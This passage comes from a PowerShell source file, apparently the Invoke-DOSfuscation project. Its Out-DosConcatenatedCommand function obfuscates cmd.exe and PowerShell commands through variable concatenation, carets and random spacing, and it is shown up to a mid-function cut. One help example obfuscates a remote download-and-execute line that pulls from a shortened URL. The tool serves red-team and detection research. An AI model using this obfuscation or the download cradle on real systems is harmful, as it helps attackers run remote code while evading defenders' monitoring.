F^OR , /^f; " tokens= +2delims=Yhf=Z"; ;%^o, ^iN , ; ( ,' ; ;^^a^^S^^SoC , , ^|, ^^F^^Ind , "md=" ,,' ;,);;^do , %^o, ; , HhKx; rC/^c  " , (^sEt ^ _ ^  ^ =n)&&( (s^Et  ^ ^,^ ^ =^t)  , )& ( (^s^e^T ^  ^[  ^ ^ = ) )&&(  , (^SE^T ^} ^  =^o) ; ; )& ( (S^eT  ^ ^_^ ^ =n)  , )& (  ,  , ,(S^eT ^ ^?  =^-)  ,)&(SE^t ~^  ^ =^t)&& (  , (S^e^T ^ ^{  =^s) )&&  ( ;  (^s^ET  ^ ^; ^ ^ =^a)  )&&( (^SET #^ ^  =^a)  )&  ( ; ; (^s^ET  ^ ^.^   =^e),  , ,  )&&  (^SE^T  ^ ^* ^  =^t)&&   ;, C^a^l^l, , ^S^E^T   ?      =%^_^ ^ %%^.^   %%^* ^  %%^{  %%~^  ^ %%#^ ^  %%^,^ ^ %%^[  ^ ^ %%^?  %%^; ^ ^ %%_ ^  ^ %%^} ^  %&&; ,(^c^a^L^l , ; %?  ^  ^ ^ %)"

.EXAMPLE

C:\PS> Out-DosConcatenatedCommand -Command 'netstat -ano' -CmdSyntax '%ProgramData:~0,1%%ProgramData:~9,2%' -StdIn

%ProgramData:~0,1%%ProgramData:~9,2% /C"set rSb=-&&set Dc1I=n&&set Ei65=stat &&set eLux=a&&set 9Lm=t&&set 6KYt=o&&set Xx=ne&&call set BY6=%Xx%%9Lm%%Ei65%%rSb%%eLux%%Dc1I%%6KYt%&&call %BY6%"

.EXAMPLE

C:\PS> Out-DosConcatenatedCommand -Command 'net""stat -""ano | find "0.0.0.0"' -CmdSyntax 'c:\does\not\exist\..\..\..\windows\system32\cmd.exe' -ConcatenationPercent 75 -RandomCase -RandomSpace -VarNameSpecialChar -StdIn

C:\dOEs\nOT\ExISt\..\..\..\WInDOWs\SYStem32\Cmd.eXE   /v:o    /C  "  sET     '.]-=""&  set    .`]@=-&set  ]@=""&SEt  _-;=""an&set _,-]=.&  Set    \?{=o &SET +`=0.&sET     _-$;=0&&  seT }$=et&&SET    *_=d&sET +'[=n&set @{=0""&&    seT  *]= &&   seT    @[_=i&&  SET  ~'=^^^^^^^|&&seT  `'\=f&&   sET    `-@[=t &&   Set   `-';=t&& SeT  '$*[=s&&SET     ~?-=""&&   SET    `[+=0&   set *,?=.&&    SEt  -_=""&& seT   }?@+=a&   SET    $#'= &&SeT     {[;~=n&sET _.$\=""&&    CAll  seT    ~*`\=%+'[%%}$%%~?-%%'.]-%%'$*[%%`-';%%}?@+%%`-@[%%.`]@%%]@%%_-;%%\?{%%~'%%$#'%%`'\%%@[_%%{[;~%%*_%%*]%%_.$\%%_-$;%%*,?%%+`%%`[+%%_,-]%%@{%&CAlL  eChO %~*`\:""=!-_:~ 0,-1!%" |cMD

.EXAMPLE

C:\PS> Out-DosConcatenatedCommand -Command 'IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/L3g1t")' -RandomCase -RandomSpace -RandomSpaceRange @(25..50) -VarNameWhitespace -FinalBinary 'powershell'

cMD.eXe                       /V:                                                            /c                             "                seT                                     `       =L3g1&                                    SEt                                       [  =N&&                                                 Set                                                 _      =S&                                               Set                               *   =ent&&                                                 Set                                       ;  =WebC&&                                     sEt                                                  ?  =t&                                                 sET                               _    =:/&&                                               SEt                                                  ,   =/&&                                      sET                                                   `    =li&&                                             sET                                -      =n&&                                           sET                                    +     =/bi&&                                       SeT                                                  '     =l&&                                    sET                              '  =ad&                                                  set                                 ,      =.&                                                  SET                                                ]    =IEX&                                set                                     ~    =ttp&&                            SET                                +   =Ob&&                                sET                                              #   =).&                                                 SeT                                                ?      =t&                                             SeT                                   *  = (&&                            SET                                             #  =o&&                              SET                                     .    = Ne&&                               set                                 {    =w&&                                  Set                                            *    =""h&&                               SeT                                                -  =""&                                     SET                                   *       =t"")&&                                  SET                          -    =D&                                        SET                            +    =w&                                   seT                                             `   =ly&&                                      SeT                                    ;   =e&                                        SEt                                         \    =.&                                       set                          ~  =ect&&                                 set                                                @   =j&                          Set                                           {   =-&&                                 set                                              @    =tring(&                                                 SeT                             \  =o&                                                     CAlL                    SeT                                \      =%]    %%*  %%[  %%;   %%+    %%{   %%+   %%@   %%~  %%.    %%?      %%\    %%;  %%`    %%*   %%#   %%-    %%\  %%{    %%-      %%'     %%#  %%'  %%_      %%@    %%*    %%~    %%_    %%+     %%?  %%,      %%`   %%,   %%`       %%*       %&&              CAlL                   PoweRShElL            "%\      :""=\!-  :~                                     0,                            -1!%"                   "

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [System.String]
        $Command,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('cmd','powershell','none')]
        [System.String]
        $FinalBinary = 'none',
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $CmdSyntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $Cmd2Syntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $PowerShellSyntax = (Get-Random -InputObject @('powershell','powershell.exe',(Get-ObfuscatedPowerShell -ObfuscationType env),(Get-ObfuscatedPowerShell))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $StdIn,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString1,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString2,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -and -not ($_.Trim().ToLower().StartsWith('v:of')) } )]
        [System.String]
        $VFlag = (Get-Random -InputObject @('V','V:','V:O','V:ON')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $ConcatenationPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomFlag,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
           
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCaretPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomCharRange = @(1..5),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ -ge 0) -and ($_ -le 100) } )]
        [System.Int16]
        $RandomCharPercent = 50,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | where-object { @(',',';') -contains $_ }) -or ($_ | where-object { ($_.Count -eq 2) -and (@(',',';') -contains $_[0]) -and (@(',',';') -contains $_[1]) }) } )]
        [System.Object[]]
        $RandomCharArray = (Get-Random -InputObject @(@(','),@(';'),@(',',';'))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameSpecialChar,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $VarNameWhitespace
    )

    # Create "profiles" depending on -ObfuscationLevel value and the length of the input -Command value. This is to simplify general usage of this function without becoming overwhelmed by all of the options.
    if ($ObfuscationLevel)
    {
        switch ($ObfuscationLevel)
        {
            '1' {
                $StdIn                = $false
                $VFlag                = 'V:ON'
                $ConcatenationPercent = Get-Random -InputObject @(10..15)
                $RandomCase           = $false
                $RandomSpace          = $false
                $RandomCaret          = $false
                $RandomChar           = $false
                $VarNameSpecialChar   = $false
                $VarNameWhitespace    = $false

                $CmdSyntax            = Get-Random -InputObject @('cmd','cmd.exe')
                $Cmd2Syntax           = Get-Random -InputObject @('cmd','cmd.exe')
                $PowerShellSyntax     = Get-Random -InputObject @('powershell','powershell.exe')
            }
            '2' {
                $StdIn                = Get-Random -InputObject @($true,$false)
                $ConcatenationPercent = Get-Random -InputObject @(10..15)
                $RandomCase           = $true
                $RandomSpace          = $true
                $RandomSpaceRange     = @(0..2)
                $RandomFlag           = $true
                $RandomCaret          = $true
                $RandomCaretPercent   = Get-Random -InputObject @(15..25)
                $RandomChar           = $true
                $RandomCharRange      = @(1..2)
                $RandomCharPercent    = Get-Random -InputObject @(15..25)
                $RandomCharArray      = Get-Random -InputObject @(@(','),@(';'))
                $VarNameSpecialChar   = $false
                $VarNameWhitespace    = $false

                $CmdSyntax            = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax           = Get-ObfuscatedCmd        -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax     = Get-ObfuscatedPowerShell -ObfuscationType env -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
            '3' {
                # Randomly generate values for decoy strings and /V flag if not explicitly set (or if set to default values).
                if (-not $DecoyString1)
                {
                    $DecoyString1 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (-not $DecoyString2)
                {
                    $DecoyString2 = -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122))) -Count (Get-Random -InputObject @(1..10)))
                }
                if (@('V','V:','V:O','V:ON') -contains $Vflag)
                {
                    do
                    {
                        $vFlagTemp = 'V' + -join (Get-Random -InputObject ([System.Char[]] (@(48..57) + @(65..90) + @(97..122)) + @('~','!','@','#','$','*','(',')','-','_','+','=','{','}','[',']',':',';','?')) -Count (Get-Random -InputObject @(1..10)))
                    }
                    while (($vFlagTemp.Trim() -match '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -or ($vFlagTemp.Trim().ToLower().StartsWith('v:of')))
                    $VFlag = $vFlagTemp
                }

                $StdIn                = $true
                $ConcatenationPercent = Get-Random -InputObject @(75..90)
                $RandomCase           = $true
                $RandomSpace          = $true
                $RandomSpaceRange     = @(0..2)
                $RandomFlag           = $true
                $RandomCaret          = $true
                $RandomCaretPercent   = Get-Random -InputObject @(35..50)
                $RandomChar           = $true
                $RandomCharRange      = @(1..2)
                $RandomCharPercent    = Get-Random -InputObject @(35..50)
                $RandomCharArray      = @(',',';')
                if (Get-Random -InputObject @(0..1))
                {
                    $VarNameSpecialChar = $false
                    $VarNameWhitespace  = $true
                }
                else
                {            
                    $VarNameSpecialChar = $true
                    $VarNameWhitespace  = $false
                }

                # Override certain values for unusually large commands to try to remain under the 8,190 character limit of cmd.exe.
                if (($Command.Length -gt 150) -and ($Command.Length -le 500))
                {
                    $ConcatenationPercent = Get-Random -InputObject @(30..40)
                    $RandomCharPercent    = Get-Random -InputObject @(15..25)
                    $RandomCaretPercent   = Get-Random -InputObject @(15..25)
                }
                elseif ($Command.Length -gt 500)
                {
                    $ConcatenationPercent = Get-Random -InputObject @(10..15)
                    $RandomCharPercent    = Get-Random -InputObject @(5..10)
                    $RandomCaretPercent   = Get-Random -InputObject @(5..10)
                }

                $CmdSyntax        = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $Cmd2Syntax       = Get-ObfuscatedCmd        -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
                $PowerShellSyntax = Get-ObfuscatedPowerShell -ObfuscationType (Get-Random -InputObject @('assoc','ftype')) -DoubleEscape -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent
            }
        }
    }

    # Set regex values to identify and replace the two single-alphanumeric character variables for the FOR loop at the end of this function if intricate syntax for $Cmd2Syntax or $PowerShellSyntax are used.
    $intricateForLoopRegex1 = '[\s\^\(,;]\%\^{0,1}[a-z0-9][\s\^\(,;]+I\^{0,1}N[\s\^,;]'
    $intricateForLoopRegex2 = 'D\^{0,1}O[\s\^\(,;]+\%\^{0,1}[a-z0-9]'

    # Check for intricate syntax (FOR LOOP) in input binary syntaxes.
    $intricateSyntaxRegex      = "$intricateForLoopRegex1.*$intricateForLoopRegex2"
    $intricateCmdSyntax        = $false
    $intricateCmd2Syntax       = $false
    $intricatePowerShellSyntax = $false
    if ($CmdSyntax -match $intricateSyntaxRegex)
    {
        $intricateCmdSyntax = $true
    }
    if ($Cmd2Syntax -match $intricateSyntaxRegex)
    {
        $intricateCmd2Syntax = $true
    }
    if ($PowerShellSyntax -match $intricateSyntaxRegex)
    {
        $intricatePowerShellSyntax = $true
    }

    # If using one of the more intricate PowerShell syntaxes that contain additional execution logic to retrieve the binary name then ensure that PowerShell commands are set to StdIn.
    if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent) -and $intricatePowerShellSyntax)
    {
        $StdIn = $true
    }

    # Check user-input $Command for uneven double quotes.
    if (Test-ContainsUnevenDoubleQuote -Command $Command)
    {
        return $null
    }

    # Remove any invalid tab characters from user-input $Command.
    if (-not ($Command = Remove-Tab -Command $Command))
    {
        return $null
    }

    # If user-input $Command contains characters that need escaping and no -FinalBinary has been selected then override to -FinalBinary 'cmd'.
    if (($FinalBinary -eq 'none') -and (Test-ContainsEscapableCharacter -Command $Command))
    {
        $FinalBinary = 'cmd'
    }

    # If cmd.exe-style environment variables are found in the user-input $Command then ensure that -StdIn (unless $FinalBinary is 'powershell') is selected and -FinalBinary is not 'none'.
    # Try to rule out multiple instances of '%' in the command being used in the context of PowerShell (as an alias of the foreach-object cmdlet) and not and cmd.exe environment variable (e.g. PowerShell.exe <PS command> | % { <for each object do ___> })
    if (($Command -match '\%.*\%') -and ($Command -notmatch '( |\|)\%\s*{'))
    {
        # Set $StdIn to $true if it currently is not.
        if (-not $StdIn.IsPresent -and ($FinalBinary -ne 'powershell'))
        {
            $StdIn = $true
        }

        # Set $FinalBinary to 'cmd' if it is not defined.
        if ($FinalBinary -eq 'none')
        {
            $FinalBinary = 'cmd'    
        }
    }

    # If -FinalBinary is 'cmd' and -StdIn is selected and user-input $Command contains an escapable character within a string then change -StdIn to $false due to escaping complexities.
    if (($FinalBinary -eq 'cmd') -and $StdIn.IsPresent -and (Test-ContainsEscapableCharacterInString -Command $Command))
    {
        $stdIn = $false
    }

    # Perform an additional layer of escaping specifically for PowerShell commands containing escapable characters within various string tokens.
    if ($FinalBinary -eq 'powershell')
    {
        $Command = Out-EscapedPowerShell -CommandToEscape $Command -StdIn:$StdIn
    }

    # Maintain array to ensure all randomly-generated variable names are unique per function invocation (and that single-character FOR loop variables do and unique leading characters maintained for any potential FOR loops in the command) to prevent variable name collisions.
    $script:varNameArray = @()

    # Maintain array to ensure all single-character FOR loop variable names do not collide with any additional randomly-generated variable names.
    $script:reservedUniqueFirstChars = @()

    # Store all substrings in an array for randomization during SET variable syntax generation.
    $substringArray  = @()
    
    # Randomly concatenate input $Command.
    if (($FinalBinary -eq 'powershell') -and ($StdIn.IsPresent))
    {
        $substringArray = Split-Command -CommandToSplit $Command -ConcatenationPercent $ConcatenationPercent -DoubleEscape:$false
    }
    else
    {
        $substringArray = Split-Command -CommandToSplit $Command -ConcatenationPercent $ConcatenationPercent -DoubleEscape:$StdIn
    }

    # Generate random variable names and create an array of SET commands for input $substringArray.
    $setVarResults = Out-SetVarCommand -SubstringArray $substringArray -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace

    # Extract SET command syntax array and random variable name array.
    $setCommandArray    = $setVarResults[0]
    $setCommandVarArray = $setVarResults[1]

    # Generate unique, random variable name and set in two separate variables so we can add an optional replacement syntax to second usage of var name in special case with paired double quotes.
    $commandVarNameSet = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    $commandVarNameGet = $commandVarNameSet
    
    # If non-paired double quotes exist then we need to add /V:ON and double quotes in a random variable.
    # This is because double quotes can not technically be escaped in cmd.exe.
    # Instead we must make sure it falls into one of several scenarios to not be treated at the end of the command.
    # /S flag is unsatisfactory in a few fringe cases, thus the /V:ON route.
    # We will store "" in a variable and then replace the final command's "" with one character of our newly-set variable, which would resolve to a single ". #RubeGoldberg
    $setQuoteVariableSyntaxArray = @()
    if ($Command.Replace('""','').Contains('"'))
    {
        # Generate unique, random variable name and set in two separate variables so we can add an optional replacement syntax to second usage of var name in special case with paired double quotes.
        $quoteRandomVarName = Get-RandomVarName -VarNameSpecialChar:$VarNameSpecialChar -VarNameWhitespace:$VarNameWhitespace
    
        # Randomly select single quote substring indexes. Each of these will produce a single character from the two-character value of "" that we will set in this variable.
        $randomPositiveInt = Get-Random -InputObject @(1..100)
        $substringIndex    = Get-Random -InputObject @('0,1','0,-1','-0,1','-0,-1','1','-1',"1,$randomPositiveInt",'-1',"-1,$randomPositiveInt")

        # Add random whitespace and plus signs to $substringIndex.
        $substringIndexSplit = $substringIndex.Split(',') | foreach-object {
            # Set random whitespace values for substring index value if -RandomSpace switch is set.
            $randomSpaceA = ''
            if ($RandomSpace.IsPresent)
            {
                $randomSpaceA = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            }

            # Randomly add explicit '+' sign to positive index value option if -RandomChar is selected.
            $randomPlusSign = ''
            if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
            {
                if (-not $_.StartsWith('-'))
                {
                    $randomPlusSign = '+'
                }
            }
    
            $randomSpaceA + $randomPlusSign + $_
        }

        # Join $substringIndexSplit back with a comma.
        $substringIndex = $substringIndexSplit -join ','

        # With /V:ON in use we can use !var! syntax inside of the larger %var% syntax without conflicting % syntax.
        if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent))
        {
            # We must add a \ for PowerShell payloads to escape the resultant expanded double quote by the time this hits powershell.exe's command line arguments (when StdIn is not used).
            $commandVarNameGet = $commandVarNameGet + ":`"`"=\!$quoteRandomVarName`:~$substringIndex!"
        }
        else
        {
            $commandVarNameGet = $commandVarNameGet + ":`"`"=!$quoteRandomVarName`:~$substringIndex!"
        }
        
        # Set random whitespace values if -RandomSpace switch is set.
        $RandomSpace1 = ''
        $RandomSpace2 = ''
        $RandomSpace3 = ''
        if ($RandomSpace.IsPresent)
        {
            $randomSpace1  = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            $randomSpace2  = ' ' * (Get-Random -InputObject $RandomSpaceRange)
            $randomSpace3  = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        }
    
        # Set random case values if -RandomCase switch is set.
        $set    = 'set'
        $andAnd = '&&'
        $VFlag = '/' + $VFlag.TrimStart('/') + $randomSpace1
        if ($RandomCase.IsPresent)
        {
            $set    = Out-RandomCase $set
            $VFlag = Out-RandomCase $VFlag
            $andAnd = Get-Random -InputObject @('&','&&')
        }

        # Add random carets if -RandomCaret switch is set.
        if ($RandomCaret.IsPresent)
        {
            $set                = Out-ObfuscatedCaret -StringToObfuscate $set                -RandomCaretPercent:$RandomCaretPercent
            $VFlag             = Out-ObfuscatedCaret -StringToObfuscate $VFlag             -RandomCaretPercent:$RandomCaretPercent
            $quoteRandomVarName = Out-ObfuscatedCaret -StringToObfuscate $quoteRandomVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Create SET syntax for variable containing paired double quotes.
        $setQuoteVariableSyntaxArray += "$set $randomSpace2$quoteRandomVarName=`"`"$andAnd$randomSpace3"
    }
    elseif ($Command.Contains('""'))
    {
        # No need for $VFlagif not performing nested variable substring/character replacement for double quote reduction.
        $VFlag = $null

        if (($FinalBinary -eq 'powershell') -and (-not $StdIn.IsPresent))
        {
            # Escape PowerShell paired double quotes with powershell.exe-level escaping using the \ escape character.
            $setCommandArray = $setCommandArray | foreach-object {
                if ($_.Contains('""'))
                {
                    $_.Replace('""','\"\"')
                }
                else
                {
                    $_
                }
            }
        }        
    }
    else
    {
        # No need for $VFlagif not performing nested variable substring/character replacement for double quote reduction.
        $VFlag = $null
    }
    
    # Concatenate all $set*Array variables to randomize their SET commands at the beginning of the final command.
    $allSetCommandArray = $setCommandArray + $setQuoteVariableSyntaxArray

    # Join all set commands in random order.
    $joinedSetSyntax = -join (Get-Random -InputObject $allSetCommandArray -Count $allSetCommandArray.Count)

    # Join all variable names represented in above join command. This is for setting the concatenated command into a final new variable to look less suspicious in either ECHO-into-pipe or child process arguments.
    $joinedCommandVarNames = '%' + ($setCommandVarArray -join '%%') + '%'

    # Set necessary component values.
    $call1  = 'call'
    $call2  = 'call'
    $set    = 'set'
    $echo   = 'echo'
    $andAnd = '&&'
    $c1     = 'C'
    $c2     = 'C'

    # Set random flag values if -RandomFlag switch is set.
    if ($RandomFlag.IsPresent)
    {
        # Randomly choose between /C and /R flags since these flags are interchangeable for compatibility reasons (per "cmd.exe /?").
        $c1 = (Get-Random -InputObject @($c1,'R'))
        $c2 = (Get-Random -InputObject @($c2,'R'))
    
        # 1:4 decide if using environment variable syntax for first character of flag value.
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c1 = (Out-EnvVarEncodedCommand -StringToEncode $c1.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c1.Substring(1)
        }
        if ((Get-Random -InputObject @(0..3)) -eq 0)
        {
            $c2 = (Out-EnvVarEncodedCommand -StringToEncode $c2.Substring(0,1) -EnvVarPercent 100 -RandomCase:$RandomCase -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomCaret:$RandomCaret -RandomCaretPercent:$RandomCaretPercent) + $c2.Substring(1)
        }
    }

    # Set random case values if -RandomCase switch is set.
    if ($RandomCase.IsPresent)
    {
        $call1  = Out-RandomCase $call1
        $call2  = Out-RandomCase $call2
        $set    = Out-RandomCase $set
        $echo   = Out-RandomCase $echo
        $c1     = Out-RandomCase $c1
        $c2     = Out-RandomCase $c2
        $andAnd = Get-Random -InputObject @('&','&&')
        
        # Only randomize the case of $CmdSyntax, $Cmd2Syntax and $PowerShellSyntax if they do not have escapable characters (as some of the more intricate syntaxes containing escapable characters are case-sensitive).
        if (-not $intricateCmdSyntax)
        {
            $CmdSyntax = Out-RandomCase $CmdSyntax
        }
        if (-not $intricateCmd2Syntax)
        {
            $Cmd2Syntax = Out-RandomCase $Cmd2Syntax
        }
        if (-not $intricatePowerShellSyntax)
        {
            $PowerShellSyntax = Out-RandomCase $PowerShellSyntax
        }
    }

    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $call1 = Out-ObfuscatedCaret -StringToObfuscate $call1 -RandomCaretPercent:$RandomCaretPercent
        $call2 = Out-ObfuscatedCaret -StringToObfuscate $call2 -RandomCaretPercent:$RandomCaretPercent
        $set   = Out-ObfuscatedCaret -StringToObfuscate $set   -RandomCaretPercent:$RandomCaretPercent
        $echo  = Out-ObfuscatedCaret -StringToObfuscate $echo  -RandomCaretPercent:$RandomCaretPercent
        if ($c1 -notmatch '\%.*\:.*\%')
        {
            $c1 = Out-ObfuscatedCaret -StringToObfuscate $c1 -RandomCaretPercent:$RandomCaretPercent
        }
        if ($c2 -notmatch '\%.*\:.*\%')
        {
            $c2 = Out-ObfuscatedCaret -StringToObfuscate $c2 -RandomCaretPercent:$RandomCaretPercent
        }

        $commandVarNameGet = Out-ObfuscatedCaret -StringToObfuscate $commandVarNameGet -RandomCaretPercent:$RandomCaretPercent  
    }

    # Set random whitespace values if -RandomSpace switch is set.
    $randomSpace1 = ''
    $randomSpace2 = ''
    $randomSpace3 = ''
    $randomSpace4 = ''
    if ($RandomSpace.IsPresent)
    {
        $randomSpace1 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace2 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $randomSpace3 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
        $RandomSpace4 = ' ' * (Get-Random -InputObject $RandomSpaceRange)
    }

    # Get random commas and/or semicolons (and whitespace mixed in if -RandomSpace is also selected).'
    $randomChar1  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar2  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar3  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar4  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar5  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar6  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar7  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar10 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray

    # If -RandomChar argument is selected then add random parenthese layers where applicable based on $RandomCharRange.
    if ($RandomChar.IsPresent)
    {
        # Retrieve parenthesis counts from $randomCharRange so we get a balanced number of left and right parentheses from Get-RandomWhitespaceAndRandomChar.
        $parenCount1 = Get-Random -InputObject $randomCharRange -Count 1
        $parenCount2 = Get-Random -InputObject $randomCharRange -Count 1

        # Get random left and right parentheses with random whitespace if -RandomWhitespace argument is selected and with random commas and/or semicolons delimiters if -RandomChar argument is selected.
